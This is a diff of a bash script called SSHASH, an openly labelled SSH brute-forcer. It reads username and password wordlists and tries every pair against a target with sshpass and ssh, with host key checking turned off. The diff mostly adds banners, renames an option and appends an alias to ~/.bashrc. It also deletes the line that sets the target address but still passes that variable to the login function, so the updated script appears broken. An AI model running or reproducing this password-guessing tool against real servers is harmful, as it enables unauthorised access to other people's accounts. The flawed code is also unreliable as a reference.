@@ -1,19 +1,30 @@
 #!/bin/bash
 
+#Developed by : Trabbit
+# V2.0
+# github.com/RAPS-LAUNCHER/SSHASH
+#
+#
 
 # Configurations
-alias_to_add='alias sshash="cd && cd SSHASH && chmod +x * && ./sshash"'    
+alias_to_add='alias sshash="cd && cd sshash && chmod +x * && ./sshash"'
+
 if ! grep -qxF "$alias_to_add" ~/.bashrc; then
     echo "$alias_to_add" >> ~/.bashrc
+    clear
+    source ~/.bashrc
     echo "Alias ajouté à ~/.bashrc"
-else
-    echo "L'alias est déjà présent dans ~/.bashrc"
+    sleep 0.5
+    clear
 fi
+
+version="V2.0"
 
 # Installations
 if ! command -v nslookup &>/dev/null; then
     echo "[i] Installing nslookup..."
-                                                                               if [[ "$(uname -o 2>/dev/null)" == "Android" ]]; then                          pkg update
+if [[ "$(uname -o 2>/dev/null)" == "Android" ]]; then
+    pkg update
         pkg install dnsutils
     elif [ "$(uname)" == "Linux" ]; then
         sudo apt-get update
@@ -38,72 +49,122 @@ function test_ssh_password {
     ssh_command="sshpass -p '$2' ssh -o StrictHostKeyChecking=no -p $3 $1@$4 'echo SSH Login Successful'"
     if output=$(eval "$ssh_command" 2>&1); then
         if [[ $output == *"SSH Login Successful"* ]]; then
-            echo "SSH Login Successful - $1:$2"
+            echo "SSH Login Successful - $1:$2 [SUCCESS]"
         else
-            echo "SSH Login Failed - $1:$2"
+            echo "SSH Login Failed - $1:$2 [FAIL]"
         fi
     else
-        echo "SSH Login Failed - $1:$2"
+        echo "SSH Login Failed - $1:$2 [FAIL]"
     fi
 }
 
+if [[ -z $ssh_port ]]; then
+    ssh_port=22
+fi
+
 # Parse command-line arguments
-while getopts ":u:i:p:l:" opt; do
+while getopts ":u:t:p:l:" opt; do
     case $opt in
         u) userlist_path=$OPTARG ;;
-        i) host_ip_or_url=$OPTARG ;;
+        t) host_ip_or_url=$OPTARG ;;
         p) ssh_port=$OPTARG ;;
         l) passwordlist_path=$OPTARG ;;
         \?) echo "Invalid option: -$OPTARG" >&2; exit 1 ;;
     esac
 done
 
-if [[ -z $host_ip_or_url ]]; then
-    echo "Please provide the IP address or URL using the -i option."
-    exit 1
-fi
-
-# Additional check for IP or URL
-if [[ $host_ip_or_url =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
-    host_ip=$host_ip_or_url
-else
-    host_ip=$(nslookup $host_ip_or_url | awk '/^Address: / { print $2 }')
-fi
-
 if [[ -z $userlist_path ]]; then
-    echo "Please provide the path to the user list using the -u option."
+    echo "   __. __..  ..__. __..  .  "
+    echo "  (__ (__ |__|[__](__ |__|  "
+    echo "  .__).__)|  ||  |.__)|  |  "
+    echo "  ------------------------  "
+    echo "  SSH CONNEXION BRUTEFORCER "
+    echo
+    echo "| R.C.S.A. | RAPS CYBER SECURITY AGENCY.            "
+    echo "  WARNING: DO NOT USE FOR ILLEGAL/UNETHICAL PURPOSES. "
+    echo
+    echo
+    echo "Usage: sshash -u <user_file> -t <target> -p <port> -l <password_file> "
+    echo
+    echo
+    echo "Options: "
+    echo " -u users_file "
+    echo " -t target <ip or url> "
+    echo " -p port "
+    echo " -l password_list "
+    echo
+    echo "Exemples: "
+    echo " sshash -u usernames.txt -t https://exemple.com -p 22 -l passwords.txt   "
+    echo " sshash -u usernames.txt -t 192.168.123.32 -p 80 -l passwords.txt        "
+    echo " sshash -u users.txt -t https://exemple.com -l passwords.txt             "
+    echo
+    echo
     exit 1
-fi
+elif [[ -z $host_ip_or_url ]]; then
+        clear
+        echo "Please provide a target -t <URL or IP>. "
+        exit 0
+elif [[ -z $passwordlist_path ]]; then
+        clear
+        echo "Please provide a password file -l."
+        exit 0
+else
 
-if [[ -z $passwordlist_path ]]; then
-    echo "Please provide the path to the password list using the -l option."
-    exit 1
-fi
-
-if [[ -z $ssh_port ]]; then
-    ssh_port=22
-fi
 
 IFS=$'\r\n' GLOBIGNORE='*' command eval 'users=($(cat "$userlist_path"))'
 IFS=$'\r\n' GLOBIGNORE='*' command eval 'passwords=($(cat "$passwordlist_path"))'
 
-echo "         __. __..  ..__. __..  .  "
-echo "        (__ (__ |__|[__](__ |__|  "
-echo "        .__).__)|  ||  |.__)|  |  "
+
+echo "                                                              "
+echo "                               ›—zÇGÅggÞ66Þí                  "
+echo "                             zÏgÅgggÞ6Ï{›{ügÇ—                "
+echo "                            zggÅÅÅÅÅÇüGGÇÏízüg{               "
+echo "                            {ÅÅÅÅÅÅÅÅgggGGg6ÞÅGz›             "
+echo "                            zÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÇüÞ—              "
+echo "                            ›ÅÅÅÅÅÅÅÅÅÅÅÅÅü{ÞÇÇ               "
+echo "                             ÞÅÅÅÅÅÅÅÅÅÅÅÅí›ÞÅÏ               "
+echo "                            ÏÅÅÅÅÅÅÅÅÅÅÅÅÅÅÞÏÞÏ{              "
+echo "                            ÏÅÅÅÅÅÅÅÅÅ6ÅÅgÏ›—üG{              "
+echo "                             ÇÅÅÅÅÅÅÅg{ÏÅÅÅÇígÏ               "
+echo "                              {GÅÅÅÅÅÅÞ6ÅÅÅ6{›                "
+echo "                              {GÅÅÅÅÅÅÇ{Gí—Þ{›                "
+echo "                            —ÇÅÅÅÅÅÅÅÅÅggü›zÇgü›              "
+echo "                          ›üÅÅggÅÅÅÅÅÅÅgz—gü6ÅÅgz             "
+echo "                        ›ÏgÅÅÅÇígÅÅÅÅgGGGÅÅÏ—gÅÅÅGí           "
+echo "                       zÅÅÅÅÅÅü  ügÅÅÅÅÅÅgz  GÅÅÅÅÅÅ—         "
+echo "                     í6GÅÅÅÅÅÅÇ›   {6gGü—   ›gÅÅÅÅÅÅGü—       "
+echo "                  —GÅÅÅÅÅÅÅÅÅÅgí  zgÅÅÅÅG{  üÅÅÅÅÅÅÅÅÅÅÅ6›    "
+echo "                 ›zÞÅÅÅÅÅÅÅÅÅÅÅgÏÞízgÅÅgízG6ÅÅÅÅÅÅÅÅÅÅÅÅÇí    "
+echo "                     {GÅÅÅÅÅÅÅÅÅÅ—  üÅgz  {ÅÅÅÅÅÅÅÅÅÅÇ—       "
+echo "                        íÇgÅÅÅÅÅÅgí›ÅgGÇ›ÏÅÅÅÅÅÅÅg6—          "
+echo "                           —6ÅÅÅÅÅÅgÅÅÅÅgÅÅÅÅÅgÏ›             "
+echo "                              —ügÅÅÅÅÅÅÅÅÅÅGÏ›                "
+echo "                                 —ÏgÅÅÅÅGýz›                  "
+echo "                                   ›zíiúiÿ<                   "
 echo
-echo "   * SSHASH CONNECTION BRUTE FORCER *   "
-echo "{>====================================<}"
+echo -e "\e[33m                             DEVELOPED BY \e[35mTRABBIT          \e[0m"
+echo
+
+
+
+echo "                          __. __..  ..__. __..  .  "
+echo "                         (__ (__ |__|[__](__ |__|  "
+echo "                         .__).__)|  ||  |.__)|  |  "
+echo
+echo "                    * SSHASH CONNECTION BRUTE FORCER *   "
+echo "           {>===============================================<}"
 
 # Display target, port, and passlist filenames, including IP or URL
-for i in "|--{[+]TARGET} => $host_ip_or_url" "|--{[+]PORT} => ${ssh_port:-22}" "|--{[+]USERLIST} => $(basename "$userlist_path")" "|--{[+]PASSLIST} => $(basename "$passwordlist_path")"; do
+for i in "           --{[+]TARGET} => $host_ip_or_url" "           --{[+]PORT} => ${ssh_port:-22}" "           --{[+]USERLIST} => $(basename "$userlist_path")" "           --{[+]PASSLIST} => $(basename "$passwordlist_path")"; do
     sleep 0.2
     echo "$i"
 done
 sleep 0.2
-echo "{>====================================<}"
-echo "     //BRUTEFORCE ATTACK STARTED//     "
-echo "{>====================================<}"
-for i in {1..39}; do
+echo "           {>===============================================<}"
+echo "                      //BRUTEFORCE ATTACK STARTED//     "
+echo "           {>===============================================<}"
+echo -n "            "
+for i in {1..49}; do
     sleep 0.01
     echo -n "*"
 done
@@ -111,9 +172,14 @@ echo
 
 for user in "${users[@]}"; do
     for password in "${passwords[@]}"; do
+        echo -n "            "
         test_ssh_password "$user" "$password" "$ssh_port" "$host_ip"
     done
 done
-echo "{>====================================<}"
-echo "                  Done.                 "
-echo "{>====================================<}"
+echo "           {>===============================================<}"
+echo "                                   Done.                 "
+echo "           {>===============================================<}"
+echo
+echo
+
+fi
